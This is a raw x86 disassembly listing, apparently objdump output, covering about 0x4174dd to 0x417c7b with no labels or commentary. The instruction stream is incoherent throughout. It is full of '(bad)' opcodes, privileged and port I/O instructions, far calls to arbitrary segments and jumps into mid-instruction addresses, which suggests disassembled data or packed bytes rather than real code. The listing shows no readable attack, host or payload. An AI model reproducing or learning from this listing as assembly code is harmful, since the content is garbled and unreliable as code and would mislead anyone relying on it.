  4174dd:	push   esp
  4174de:	xor    al,0x87
  4174e0:	sbb    DWORD PTR [edi+edx*2-0x4895fea0],0xc889f383
  4174eb:	jb     0x4174fc
  4174ed:	iret   
  4174ee:	mov    ds:0x20c3165a,al
  4174f3:	fild   WORD PTR [ebp+0x0]
  4174f6:	std    
  4174f7:	push   es
  4174f8:	cmp    bh,bl
  4174fa:	sub    ebx,DWORD PTR [ecx-0x43]
  4174fd:	mov    ah,0xd6
  4174ff:	jo     0x417482
  417501:	jg     0x4174c6
  417503:	sub    esi,esp
  417505:	adc    eax,0xf4991fc5
  41750a:	into   
  41750b:	xchg   ecx,eax
  41750c:	cmc    
  41750d:	aam    0xe1
  41750f:	pushf  
  417510:	addr16 (bad) 
  417512:	mov    ch,0xbe
  417514:	cmp    dl,BYTE PTR [ecx-0x7fff32d7]
  41751a:	retf   0x2a94
  41751d:	jns    0x417572
  41751f:	shl    ah,1
  417521:	xor    edi,DWORD PTR [eax+0x1ab9c1f2]
  417527:	imul   esp,DWORD PTR [esi+0x1fe8233b],0x4652142a
  417531:	inc    DWORD PTR [ebp+0x65]
  417534:	dec    edx
  417535:	rol    BYTE PTR [edi-0x5c5e01ae],0x1a
  41753c:	mov    ah,0x41
  41753e:	aas    
  41753f:	jno    0x417568
  417541:	mov    ds:0x9d57c738,al
  417546:	mov    ch,0xc9
  417548:	cmp    al,0x39
  41754a:	std    
  41754b:	xchg   BYTE PTR [ebx+ebx*4-0x66],ah
  41754f:	jae    0x41750d
  417551:	inc    edx
  417552:	dec    al
  417554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417556:	stos   BYTE PTR es:[edi],al
  417557:	dec    edx
  417558:	aas    
  417559:	mov    ah,0x3
  41755b:	push   0xd
  41755d:	aaa    
  41755e:	retf   
  41755f:	dec    edx
  417560:	adc    al,0xae
  417562:	or     DWORD PTR [eax],esi
  417564:	cmp    bh,BYTE PTR [edx-0x4]
  417567:	jae    0x4175e6
  417569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41756a:	lods   eax,DWORD PTR ds:[esi]
  41756b:	cdq    
  41756c:	adc    dh,al
  41756e:	jno    0x41755b
  417570:	(bad)  
  417571:	push   DWORD PTR [ebx-0x6ddb2f76]
  417577:	aam    0x22
  417579:	js     0x41759d
  41757b:	cmp    eax,0x1747c246
  417580:	sbb    BYTE PTR [ebx+0x1cf528a9],0xf7
  417587:	push   ebp
  417588:	ror    BYTE PTR [ecx-0x67],1
  41758b:	mov    esi,0x15d3f9e2
  417590:	daa    
  417591:	ins    DWORD PTR es:[edi],dx
  417592:	adc    cl,BYTE PTR [eax+ebp*8+0x1933ff44]
  417599:	pop    esi
  41759a:	adc    cl,BYTE PTR [esp+esi*8-0x65]
  41759e:	fst    DWORD PTR [ecx]
  4175a0:	sahf   
  4175a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175a2:	push   ecx
  4175a3:	dec    eax
  4175a4:	fdivr  DWORD PTR [ebp+0x44]
  4175a7:	push   edx
  4175a8:	repnz sub edi,edi
  4175ab:	or     esi,edx
  4175ad:	inc    ecx
  4175ae:	stc    
  4175af:	fstp   TBYTE PTR [edx-0x58d44277]
  4175b5:	and    dh,BYTE PTR [eax+0x18]
  4175b8:	outs   dx,BYTE PTR ds:[esi]
  4175b9:	cdq    
  4175ba:	outs   dx,BYTE PTR ds:[esi]
  4175bb:	popf   
  4175bc:	or     DWORD PTR ds:0x8e8af7ab,ecx
  4175c2:	test   al,0xb3
  4175c4:	or     ah,al
  4175c6:	xchg   esp,eax
  4175c7:	outs   dx,BYTE PTR ds:[esi]
  4175c8:	ins    BYTE PTR es:[edi],dx
  4175c9:	std    
  4175ca:	imul   ecx,edx,0xffffffa3
  4175cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175cf:	ds (bad) 
  4175d1:	push   ss
  4175d2:	ja     0x4175cd
  4175d4:	loop   0x4175ac
  4175d6:	add    BYTE PTR [edx-0x3b68e32d],bl
  4175dc:	clc    
  4175dd:	cmp    al,BYTE PTR [ebx-0x4c]
  4175e0:	sub    edi,esp
  4175e2:	je     0x41762c
  4175e4:	jp     0x417635
  4175e6:	dec    eax
  4175e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175e8:	jns    0x417634
  4175ea:	es xchg edx,eax
  4175ec:	ja     0x417611
  4175ee:	pushf  
  4175ef:	fimul  DWORD PTR [edx+eiz*4+0x7e4a2669]
  4175f6:	(bad)  
  4175f7:	sub    DWORD PTR [esi],ebx
  4175f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175fa:	not    DWORD PTR [eax-0x77ce6af2]
  417600:	mov    ds:0x909cf3c5,al
  417605:	add    eax,DWORD PTR [ebx-0x37]
  417608:	adc    BYTE PTR [ecx],ah
  41760a:	arpl   bx,sp
  41760c:	aaa    
  41760d:	leave  
  41760e:	mov    ebp,0x7b6650f
  417613:	rcl    BYTE PTR [esi+ebp*8-0x5fb2de1d],cl
  41761a:	cmp    dh,bh
  41761c:	pop    ebx
  41761d:	inc    eax
  41761e:	and    eax,ebp
  417620:	jne    0x417696
  417622:	adc    DWORD PTR [ebp+0x13],esp
  417625:	in     eax,0x3b
  417627:	shr    ebp,cl
  417629:	add    DWORD PTR [eax+0x222f3637],0xa7161e9b
  417633:	mov    ecx,cr3
  417636:	sete   dl
  417639:	mov    ebx,DWORD PTR [edi-0x22831c63]
  41763f:	das    
  417640:	xor    BYTE PTR [esi-0x508a0a34],ah
  417646:	or     DWORD PTR [ebx-0x756ba912],esi
  41764c:	jp     0x4176b7
  41764e:	cdq    
  41764f:	(bad)  
  417650:	sbb    DWORD PTR [edi+0x2d20e4c],0xffffffd0
  417657:	ret    0x770e
  41765a:	jb     0x417651
  41765c:	or     DWORD PTR [edi],ecx
  41765e:	add    esi,DWORD PTR [edi]
  417660:	jno    0x4175ea
  417662:	dec    esi
  417663:	dec    ebx
  417664:	das    
  417665:	ret    
  417666:	pop    ebx
  417667:	repnz inc eax
  417669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41766a:	push   cs
  41766b:	dec    edi
  41766c:	and    al,0xc2
  41766e:	cmp    bl,BYTE PTR [eax+edx*2]
  417671:	jg     0x417647
  417673:	pop    ss
  417674:	sar    BYTE PTR [edx+0x32586905],0x90
  41767b:	call   0x3aa3e984
  417680:	lods   al,BYTE PTR ds:[esi]
  417681:	or     ebx,DWORD PTR [ebx+ebx*4]
  417684:	jbe    0x4176b8
  417686:	jmp    0x417685
  417688:	loop   0x41762f
  41768a:	gs inc edi
  41768c:	xor    al,0x91
  41768e:	test   al,0xc7
  417690:	fcmovb st,st(6)
  417692:	jb     0x417690
  417694:	xchg   edx,eax
  417695:	shl    BYTE PTR [ecx+eax*2-0x4206366f],cl
  41769c:	(bad)  
  41769e:	pushf  
  41769f:	repz dec ebp
  4176a1:	fdiv   st(4),st
  4176a3:	sbb    DWORD PTR [eax-0x6e],ecx
  4176a6:	ss push es
  4176a8:	and    eax,0x6d6edebe
  4176ad:	mov    WORD PTR [ebx+ecx*2+0x59],ss
  4176b1:	mov    ah,0x15
  4176b3:	jecxz  0x417722
  4176b5:	fwait
  4176b6:	(bad)  
  4176b7:	(bad)  
  4176b8:	pop    esi
  4176b9:	add    DWORD PTR [ecx+0x1f],edi
  4176bc:	sub    al,0xe9
  4176be:	ror    DWORD PTR ds:0xbfb820cc,cl
  4176c4:	scas   al,BYTE PTR es:[edi]
  4176c5:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4176c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176c8:	dec    esi
  4176c9:	xor    esi,DWORD PTR ds:0xbf048a04
  4176cf:	jo     0x417655
  4176d1:	sub    eax,0x467a2ef8
  4176d6:	sub    ah,BYTE PTR [edi+0x191ab441]
  4176dc:	enter  0x366b,0x60
  4176e0:	sub    BYTE PTR [ecx],dh
  4176e2:	xchg   ebp,eax
  4176e3:	pop    ebx
  4176e4:	test   BYTE PTR [ebx+0x2f],0x17
  4176e8:	mov    al,gs:0x33158ac0
  4176ee:	jne    0x417726
  4176f0:	pop    esp
  4176f1:	inc    edi
  4176f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176f3:	cmp    ah,BYTE PTR [esi+eiz*8-0x79826742]
  4176fa:	jp     0x4176b3
  4176fc:	jns    0x4176bd
  4176fe:	shl    eax,cl
  417700:	mov    dl,BYTE PTR [ebx+ebx*8]
  417703:	aad    0x26
  417705:	push   eax
  417706:	and    al,0x3c
  417708:	je     0x417692
  41770a:	push   edx
  41770b:	mov    cs,WORD PTR [ebx+0x7c9e9d1b]
  417711:	adc    al,0x6a
  417713:	mov    eax,ds:0x2a151cc3
  417718:	mov    ch,0xb
  41771a:	clc    
  41771b:	push   0xffffff93
  41771d:	mov    ds:0xd056c47e,eax
  417722:	jns    0x41771b
  417724:	mov    edi,ds
  417726:	push   ecx
  417727:	sub    edx,ebp
  417729:	mov    ebp,0x702ee093
  41772e:	add    DWORD PTR [ebx],ebx
  417730:	mov    edx,0x707d8da
  417735:	mov    cl,BYTE PTR [ebx+0x70]
  417738:	pop    eax
  417739:	jo     0x417761
  41773b:	jl     0x417714
  41773d:	add    al,0xff
  41773f:	in     eax,0xea
  417741:	leave  
  417742:	sbb    BYTE PTR [esi+0x42],ch
  417745:	sub    eax,0xc5ea6e5b
  41774a:	pop    ss
  41774b:	outs   dx,BYTE PTR ds:[esi]
  41774c:	ja     0x41776c
  41774e:	(bad)  
  417750:	jecxz  0x417798
  417752:	mov    ebx,0x6a2d10a7
  417757:	mov    cs,WORD PTR ds:0xde86fa57
  41775d:	daa    
  41775e:	in     eax,dx
  41775f:	call   0xb32e:0x85d2fe01
  417766:	icebp  
  417767:	shl    ch,0x9a
  41776a:	iret   
  41776b:	(bad)  
  41776c:	rcl    DWORD PTR [edx-0x55f71c5f],1
  417772:	cdq    
  417773:	push   edi
  417774:	push   esp
  417775:	xor    al,0xfc
  417777:	and    eax,0x9557fe0d
  41777c:	jg     0x4177cc
  41777e:	das    
  41777f:	xchg   ebx,eax
  417780:	int    0xff
  417782:	es in  al,0x42
  417785:	dec    esp
  417786:	lds    esi,FWORD PTR [eax+edx*2]
  417789:	addr16 mov esi,0x399e0edd
  41778f:	mov    fs,WORD PTR [eax-0x575ca7a3]
  417795:	daa    
  417796:	cmc    
  417797:	test   esi,ebp
  417799:	sbb    bh,BYTE PTR [ebp+0xf]
  41779c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41779d:	test   al,0xf2
  41779f:	xor    al,0x49
  4177a1:	icebp  
  4177a2:	mov    dh,0x71
  4177a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177a5:	ja     0x4177ab
  4177a7:	sub    dl,dl
  4177a9:	ins    BYTE PTR es:[edi],dx
  4177aa:	pop    esi
  4177ab:	inc    ebx
  4177ac:	pop    edi
  4177ad:	push   esp
  4177ae:	push   eax
  4177af:	aas    
  4177b0:	js     0x417735
  4177b2:	and    DWORD PTR [ecx+0x1f],esi
  4177b5:	lahf   
  4177b6:	in     al,0x5b
  4177b8:	popa   
  4177b9:	mov    ah,0xd7
  4177bb:	xchg   esp,eax
  4177bc:	push   ebx
  4177bd:	xor    ebx,DWORD PTR ds:[esi]
  4177c0:	aaa    
  4177c1:	fs aaa 
  4177c3:	loope  0x4177ec
  4177c5:	mov    edx,0x460171e9
  4177ca:	adc    DWORD PTR es:[esi+eiz*8],0xffffffa6
  4177cf:	xchg   ecx,eax
  4177d0:	lock retf 
  4177d2:	adc    BYTE PTR fs:[edx],ch
  4177d5:	int3   
  4177d6:	dec    edx
  4177d7:	aas    
  4177d8:	push   edx
  4177d9:	popa   
  4177da:	pop    es
  4177db:	xchg   esi,eax
  4177dc:	loop   0x417819
  4177de:	jl     0x417780
  4177e0:	pop    ss
  4177e1:	mov    edx,0xa39fdb39
  4177e6:	or     DWORD PTR [edi+0x6be2ad4],0x6043d2c1
  4177f0:	cmp    eax,DWORD PTR [edi-0x31c6b080]
  4177f6:	inc    eax
  4177f7:	test   BYTE PTR ds:0xe772c1cf,cl
  4177fd:	mov    ds:0x663434bb,al
  417802:	adc    bl,cl
  417804:	add    eax,0x462e8182
  417809:	add    DWORD PTR [esi+eiz*1+0x25],esi
  41780d:	inc    ebx
  41780e:	neg    DWORD PTR [ebx-0x4a]
  417811:	fcmovb st,st(7)
  417813:	(bad)  
  417814:	bound  ebp,QWORD PTR [eax+0x78a4229d]
  41781a:	test   al,0x6f
  41781c:	pushf  
  41781d:	cmp    ah,BYTE PTR [esi+ecx*1+0x7200bbff]
  417824:	arpl   WORD PTR [ebx-0x230f05ad],bx
  41782a:	outs   dx,DWORD PTR ds:[esi]
  41782b:	lea    ecx,ds:0xa89a98b6
  417831:	adc    DWORD PTR [ebx-0x93a39f0],esp
  417837:	xor    esi,ebx
  417839:	je     0x41788a
  41783b:	xchg   ecx,eax
  41783c:	mov    dl,0xa9
  41783e:	and    ah,BYTE PTR [edi+0x3d]
  417841:	bound  ecx,QWORD PTR [edx+ecx*4]
  417844:	add    DWORD PTR [ebx+0x5f4ce17d],ebx
  41784a:	pop    eax
  41784b:	mov    ebx,ebp
  41784d:	dec    esp
  41784e:	dec    esi
  41784f:	idiv   BYTE PTR [esi+esi*8]
  417852:	dec    eax
  417853:	and    BYTE PTR [edx-0x56cfc2e],al
  417859:	fcmovbe st,st(2)
  41785b:	out    dx,al
  41785c:	sub    BYTE PTR [eax-0x52],ch
  41785f:	and    eax,0x2c88bb14
  417864:	cmp    al,0xa5
  417866:	sti    
  417867:	fisub  DWORD PTR [eax+0x65f5c3e0]
  41786d:	cmc    
  41786e:	ins    DWORD PTR es:[edi],dx
  41786f:	push   cs
  417870:	shr    BYTE PTR [edi+0x6b],1
  417873:	xor    BYTE PTR [esp+eax*1],ch
  417876:	push   ebx
  417877:	pop    ebx
  417878:	repnz (bad) 
  41787a:	in     al,dx
  41787b:	cs or  al,0xf6
  41787e:	pushf  
  41787f:	mov    edi,0x8f52995f
  417884:	and    al,0x42
  417886:	inc    ecx
  417887:	iret   
  417888:	push   esi
  417889:	push   edi
  41788a:	adc    eax,0xe063c6cb
  41788f:	and    DWORD PTR [ebp+0x5c],ebp
  417892:	aaa    
  417893:	aam    0x8a
  417895:	adc    DWORD PTR [esi],ebx
  417897:	jbe    0x417833
  417899:	mov    edi,0x1e044497
  41789e:	inc    ebx
  41789f:	pop    edi
  4178a0:	jecxz  0x417883
  4178a2:	add    al,BYTE PTR [esi+ecx*8+0x1a]
  4178a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178a7:	sub    bh,BYTE PTR [edx-0x3f]
  4178aa:	push   ecx
  4178ab:	jmp    0x41787a
  4178ad:	xor    DWORD PTR [edx+0x58e51cc7],ebp
  4178b3:	xchg   ecx,eax
  4178b4:	mov    dl,0x9d
  4178b6:	std    
  4178b7:	mov    edx,0xfdaa8e41
  4178bc:	mov    ds:0x8f268373,al
  4178c1:	sub    BYTE PTR [esi-0x723cf59a],ah
  4178c7:	fdivp  st(2),st
  4178c9:	adc    al,BYTE PTR [ebx+ecx*8+0x110f62e9]
  4178d0:	jne    0x4178ab
  4178d2:	or     al,0xff
  4178d4:	cmc    
  4178d5:	jg     0x4178ea
  4178d7:	inc    edi
  4178d8:	out    0x62,al
  4178da:	icebp  
  4178db:	jmp    0x4178b3
  4178dd:	or     esi,DWORD PTR [ebx]
  4178df:	ins    BYTE PTR es:[edi],dx
  4178e0:	dec    ebx
  4178e1:	push   0xffffffbd
  4178e3:	mul    DWORD PTR [ecx+edx*2]
  4178e6:	jg     0x417907
  4178e8:	fldenv [ecx]
  4178ea:	jb     0x4178d2
  4178ec:	add    BYTE PTR [eax-0x3a5dfaf1],dl
  4178f2:	fs push 0xffffffd1
  4178f5:	out    dx,eax
  4178f6:	sbb    al,0xaf
  4178f8:	sti    
  4178f9:	in     al,dx
  4178fa:	(bad)  
  4178fb:	or     eax,0x860efbf2
  417900:	mov    ebp,0xd0394ca7
  417905:	test   eax,0xa72fc9cd
  41790a:	or     esp,esi
  41790c:	push   edx
  41790d:	sub    eax,0x76a5cb17
  417913:	(bad)  
  417914:	jle    0x4178f3
  417916:	mov    ch,0x3c
  417918:	push   edi
  417919:	fidiv  DWORD PTR ds:[ebx-0x6e19626]
  417920:	xor    dl,BYTE PTR [ebx+0x60]
  417923:	enter  0x958,0x98
  417927:	mov    eax,ds:0x44c65034
  41792c:	xlat   BYTE PTR ds:[ebx]
  41792d:	stc    
  41792e:	jns    0x4178ee
  417930:	sub    ebx,DWORD PTR [ecx]
  417932:	pop    ds
  417933:	ja     0x41790a
  417935:	pop    es
  417936:	fsub   QWORD PTR [edx-0x3c]
  417939:	xor    edi,DWORD PTR [ebp-0x6ba0a2de]
  41793f:	xchg   esi,eax
  417940:	inc    ebx
  417941:	mov    cl,0x64
  417943:	shr    BYTE PTR [ebx],cl
  417945:	push   esp
  417946:	xchg   edx,eax
  417947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417948:	call   0x4ec7e4f4
  41794d:	dec    ecx
  41794e:	nop
  41794f:	mov    ecx,0x9e157b84
  417954:	int3   
  417955:	dec    ebx
  417956:	mov    edi,0x16493904
  41795b:	dec    edx
  41795c:	dec    esi
  41795d:	popf   
  41795e:	cmp    bl,cl
  417960:	les    ebx,FWORD PTR [edx-0x4e01d637]
  417966:	clc    
  417967:	adc    al,0xa9
  417969:	sbb    ebx,DWORD PTR [ebx]
  41796b:	ds jle 0x417906
  41796e:	xchg   edx,eax
  41796f:	mov    al,0x5e
  417971:	or     al,BYTE PTR [edx-0x14]
  417974:	mov    cl,0x9d
  417976:	mov    cl,0x92
  417978:	addr16 pop edx
  41797a:	pop    ebx
  41797b:	aad    0x98
  41797d:	sbb    al,0x4a
  41797f:	push   ebx
  417980:	or     ah,BYTE PTR ds:0xde658339
  417986:	mov    esp,0xcaa2882a
  41798b:	in     eax,dx
  41798c:	xchg   ebp,eax
  41798d:	(bad)  
  41798f:	fiadd  DWORD PTR [ecx-0x3d]
  417992:	ss inc ebx
  417994:	arpl   si,cx
  417996:	pop    esp
  417997:	and    al,0x43
  417999:	sbb    dl,BYTE PTR [edi-0x187af2cc]
  41799f:	mov    ds:0xa885623d,eax
  4179a4:	jnp    0x417a15
  4179a6:	lock fstp st(7)
  4179a9:	ja     0x417986
  4179ab:	jle    0x417965
  4179ad:	in     al,dx
  4179ae:	pushf  
  4179af:	sbb    esp,DWORD PTR [ebp+0x64]
  4179b2:	cwde   
  4179b3:	pusha  
  4179b4:	bound  ebp,QWORD PTR [edx+0x1376b440]
  4179ba:	inc    ebp
  4179bb:	sti    
  4179bc:	sti    
  4179bd:	in     al,dx
  4179be:	dec    edx
  4179bf:	mov    dl,0x4e
  4179c1:	mov    ch,dh
  4179c3:	fdiv   QWORD PTR [eax+0x10]
  4179c6:	mov    dl,0x3d
  4179c8:	das    
  4179c9:	add    al,0xb6
  4179cb:	pop    ebx
  4179cc:	lods   eax,DWORD PTR ds:[esi]
  4179cd:	je     0x417979
  4179cf:	dec    esi
  4179d0:	sbb    DWORD PTR [ecx],esi
  4179d2:	pushf  
  4179d3:	mov    ebp,0x51647da0
  4179d8:	push   ss
  4179d9:	js     0x417a1e
  4179db:	ins    BYTE PTR es:[edi],dx
  4179dc:	scas   al,BYTE PTR es:[edi]
  4179dd:	imul   BYTE PTR [ecx-0x11]
  4179e0:	loop   0x417a12
  4179e2:	retf   
  4179e3:	in     al,0x3a
  4179e5:	les    ebp,FWORD PTR [edi]
  4179e7:	mov    DWORD PTR [esp+edx*1],esp
  4179ea:	dec    eax
  4179eb:	and    DWORD PTR [ebx-0x9],ebp
  4179ee:	pop    esp
  4179ef:	in     al,0xa2
  4179f1:	(bad)  
  4179f2:	fistp  WORD PTR [esi]
  4179f4:	retf   0xc97c
  4179f7:	aad    0x21
  4179f9:	adc    edx,DWORD PTR [eax]
  4179fb:	sar    BYTE PTR [esi],0x9
  4179fe:	mov    dl,dh
  417a00:	xchg   ebx,eax
  417a01:	addr16 nop
  417a03:	sbb    ebp,ebp
  417a05:	inc    edi
  417a06:	and    eax,0x70c955cf
  417a0b:	mov    ds:0x82d8749e,al
  417a10:	sar    ecx,0xf5
  417a13:	mov    eax,ds:0x6180a7ba
  417a18:	dec    edi
  417a19:	dec    ecx
  417a1a:	stos   BYTE PTR es:[edi],al
  417a1b:	jo     0x4179c4
  417a1d:	sbb    DWORD PTR [ecx],ebp
  417a1f:	in     eax,dx
  417a20:	call   0x8a24:0xfe81c86f
  417a27:	push   ecx
  417a28:	dec    eax
  417a29:	fidivr WORD PTR [esi-0x28]
  417a2c:	enter  0xec5a,0x8a
  417a30:	seta   BYTE PTR [edx]
  417a33:	sar    BYTE PTR [ebx-0x7a],cl
  417a36:	or     eax,0x4cf4b12d
  417a3b:	nop
  417a3c:	fdivr  QWORD PTR [ebx-0x517eee85]
  417a42:	das    
  417a43:	ja     0x417a63
  417a45:	cmp    edi,DWORD PTR [edx+esi*8]
  417a48:	addr16 cwde 
  417a4a:	mov    ah,0x8e
  417a4c:	(bad)  
  417a4d:	jmp    0xe77d:0xafa1b523
  417a54:	sub    dh,ah
  417a56:	ja     0x417a11
  417a58:	es push edx
  417a5a:	mov    ax,0xb86a
  417a5e:	and    ebp,DWORD PTR ds:[ebx-0x8ed4637]
  417a65:	pop    ebx
  417a66:	repnz sbb BYTE PTR [edx+0x259336d0],cl
  417a6d:	rcr    BYTE PTR [ebp+0x28],1
  417a70:	repz sub eax,esi
  417a73:	fbld   TBYTE PTR [ecx*8+0x4e35333]
  417a7a:	fwait
  417a7b:	pop    ds
  417a7c:	xor    bl,0x88
  417a7f:	cwde   
  417a80:	mov    dl,BYTE PTR [esi+0x42]
  417a83:	lods   al,BYTE PTR ds:[esi]
  417a84:	sub    cl,BYTE PTR [esi+eax*2+0x69]
  417a88:	setae  BYTE PTR [edi+ecx*1+0x55e7b7be]
  417a90:	nop
  417a91:	(bad)  
  417a92:	or     esp,DWORD PTR [edx+0x2e]
  417a95:	ins    DWORD PTR es:[edi],dx
  417a96:	mov    ch,0x9a
  417a98:	xchg   edx,eax
  417a99:	inc    edi
  417a9a:	ret    
  417a9b:	inc    ebx
  417a9c:	in     al,0x39
  417a9e:	pop    ds
  417a9f:	das    
  417aa0:	cmp    al,0x42
  417aa2:	mov    bh,0xd9
  417aa4:	in     eax,dx
  417aa5:	ror    DWORD PTR [esi-0x59],1
  417aa8:	popf   
  417aa9:	lods   eax,DWORD PTR ds:[esi]
  417aaa:	fs and eax,0xe31b014
  417ab0:	out    dx,eax
  417ab1:	dec    esp
  417ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ab3:	stos   DWORD PTR es:[edi],eax
  417ab4:	inc    ebx
  417ab5:	jo     0x417a91
  417ab7:	sbb    DWORD PTR [edx+eax*1+0x6c],0xaba16f84
  417abf:	in     al,dx
  417ac0:	push   eax
  417ac1:	xchg   esi,eax
  417ac2:	retf   0xf546
  417ac5:	movlhps xmm1,xmm2
  417ac8:	out    0x7e,eax
  417aca:	iret   
  417acb:	cwde   
  417acc:	scas   al,BYTE PTR es:[edi]
  417acd:	dec    ebx
  417ace:	mov    DWORD PTR [edi+0x3820b6ff],ebp
  417ad4:	jne    0x417b16
  417ad6:	ja     0x417b39
  417ad8:	sbb    eax,0xeffc0e71
  417add:	ret    
  417ade:	sub    eax,0x9447722
  417ae3:	mov    DWORD PTR [esi],0xbc650c81
  417ae9:	jae    0x417adc
  417aeb:	test   BYTE PTR [ebx],cl
  417aed:	jmp    0x417b36
  417aef:	jb     0x417b30
  417af1:	mov    ah,0x5c
  417af3:	ds aaa 
  417af5:	loope  0x417a8c
  417af7:	adc    BYTE PTR [eax+esi*2+0x62],al
  417afb:	dec    edi
  417afc:	jmp    0x417b2a
  417afe:	bound  eax,QWORD PTR [edx+0x62]
  417b01:	shl    BYTE PTR [eax-0x13],cl
  417b04:	mov    al,0x39
  417b06:	add    BYTE PTR [edi],0xe1
  417b09:	mov    dh,0xc1
  417b0b:	mov    dl,0x54
  417b0d:	pop    ebx
  417b0e:	lahf   
  417b0f:	jns    0x417ac0
  417b11:	mov    cl,0xa9
  417b13:	test   DWORD PTR [eax-0x12],ebx
  417b16:	sub    edx,ecx
  417b18:	or     dh,BYTE PTR [esi+ebx*8+0x8]
  417b1c:	aaa    
  417b1d:	cmc    
  417b1e:	imul   esp,DWORD PTR [edi-0x15],0xffffffba
  417b22:	popa   
  417b23:	iret   
  417b24:	push   ds
  417b25:	mov    edx,0x19c079af
  417b2a:	mov    ds:0x81c4fb1a,eax
  417b2f:	test   bh,al
  417b31:	ins    DWORD PTR es:[edi],dx
  417b32:	cmp    eax,0xfa1297bc
  417b37:	xchg   esp,eax
  417b38:	mov    ah,0x59
  417b3a:	mov    BYTE PTR [eax-0x34cce571],ch
  417b40:	lock clc 
  417b42:	out    0x28,eax
  417b44:	cmc    
  417b45:	pushf  
  417b46:	fstp   QWORD PTR [esi+0x5c5b697]
  417b4c:	xor    bl,BYTE PTR [eax]
  417b4e:	mov    al,ds:0xf93de6a7
  417b53:	push   eax
  417b54:	pop    esp
  417b55:	inc    esi
  417b56:	push   edx
  417b57:	cmp    al,0x8e
  417b59:	adc    DWORD PTR [esi-0x42db6cbc],edx
  417b5f:	sub    DWORD PTR [edi-0x41],esp
  417b62:	xlat   BYTE PTR ds:[ebx]
  417b63:	js     0x417af0
  417b65:	mov    dh,BYTE PTR ds:0x43d25199
  417b6b:	inc    ebx
  417b6c:	push   esp
  417b6d:	jo     0x417bdf
  417b6f:	mov    ch,0x7d
  417b71:	js     0x417b83
  417b73:	rol    DWORD PTR [ebp-0x1cfaf9e9],1
  417b79:	sar    edx,cl
  417b7b:	inc    ebp
  417b7c:	jo     0x417b29
  417b7e:	xchg   esi,eax
  417b7f:	jns    0x417b2f
  417b81:	dec    esi
  417b82:	outs   dx,DWORD PTR ds:[esi]
  417b83:	mov    DWORD PTR [ebx-0xd1063c],esi
  417b89:	call   0xc877:0xc50ad1d4
  417b90:	imul   eax,DWORD PTR [ecx+eax*8-0x5f],0x93a486ca
  417b98:	gs mov ebx,0xc7772c50
  417b9e:	ret    
  417b9f:	pop    edi
  417ba0:	cmp    al,0x10
  417ba2:	jg     0x417b74
  417ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ba5:	push   cs
  417ba6:	retf   0x3d60
  417ba9:	int3   
  417baa:	xchg   edi,eax
  417bab:	and    ch,al
  417bad:	or     dh,bh
  417baf:	jle    0x417b79
  417bb1:	sub    esi,DWORD PTR [eax]
  417bb3:	mov    ch,0x7
  417bb5:	mov    bh,0x3a
  417bb7:	cdq    
  417bb8:	or     DWORD PTR [eax],eax
  417bba:	adc    al,BYTE PTR [ecx-0x75]
  417bbd:	or     esi,ebx
  417bbf:	and    al,0x78
  417bc1:	sub    ah,bh
  417bc3:	daa    
  417bc4:	or     eax,0xfdd09d4f
  417bc9:	icebp  
  417bca:	sbb    al,0xc9
  417bcc:	sbb    BYTE PTR [ecx-0x7514e735],bl
  417bd2:	add    edi,DWORD PTR [ecx-0x52]
  417bd5:	retf   0x7b2
  417bd8:	data16 add al,0x4d
  417bdb:	jp     0x417b7a
  417bdd:	mov    bl,0xbb
  417bdf:	popf   
  417be0:	or     eax,0x146acf4c
  417be5:	adc    al,0x88
  417be7:	jmp    0x42e1ee87
  417bec:	sti    
  417bed:	adc    eax,0x80089281
  417bf2:	mov    esi,0xc12c7776
  417bf7:	loope  0x417bf0
  417bf9:	push   ds
  417bfa:	mov    BYTE PTR [edx+0x3758c717],ch
  417c00:	mov    WORD PTR [ecx-0x48736d28],ds
  417c06:	scas   al,BYTE PTR es:[edi]
  417c07:	ficomp DWORD PTR [ebp+0x2a5bc60b]
  417c0d:	and    eax,0x6c2787a5
  417c12:	jno    0x417bc0
  417c14:	(bad)  
  417c15:	jmp    0xbd8d05e4
  417c1a:	(bad)  
  417c1b:	cmp    eax,0xb6db3863
  417c20:	mov    esi,0xd6928af0
  417c25:	pop    ebp
  417c26:	in     al,0x7
  417c28:	arpl   bp,ax
  417c2a:	das    
  417c2b:	mov    bh,0x6
  417c2d:	addr16 and al,0xc3
  417c30:	mov    ds:0xfb985a1e,eax
  417c35:	cli    
  417c36:	xchg   edi,eax
  417c37:	xor    DWORD PTR [eax-0x7e],edi
  417c3a:	cmp    al,BYTE PTR [ebp+0x4d]
  417c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c3e:	ja     0x417c10
  417c40:	xor    al,0xb6
  417c42:	dec    eax
  417c43:	les    esi,FWORD PTR [ecx]
  417c45:	bt     DWORD PTR [edi-0x4a],ebp
  417c49:	inc    eax
  417c4a:	push   ebp
  417c4b:	aad    0x3e
  417c4d:	push   0x4df6ff88
  417c52:	int3   
  417c53:	cdq    
  417c54:	rcl    bl,0x22
  417c57:	ds sub eax,0xd199b747
  417c5d:	pusha  
  417c5e:	jmp    0x8ad0b836
  417c63:	add    edi,DWORD PTR [edi-0x19]
  417c66:	xchg   esi,eax
  417c67:	jno    0x417cc8
  417c69:	test   BYTE PTR [ecx],ch
  417c6b:	fwait
  417c6c:	sub    eax,0x3592dd73
  417c71:	(bad)  
  417c72:	pop    esi
  417c73:	mov    WORD PTR [ebx],gs
  417c75:	mov    edi,0x25a5a19
  417c7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c7b:	and    DWORD PTR [ebx+0x2c],edi
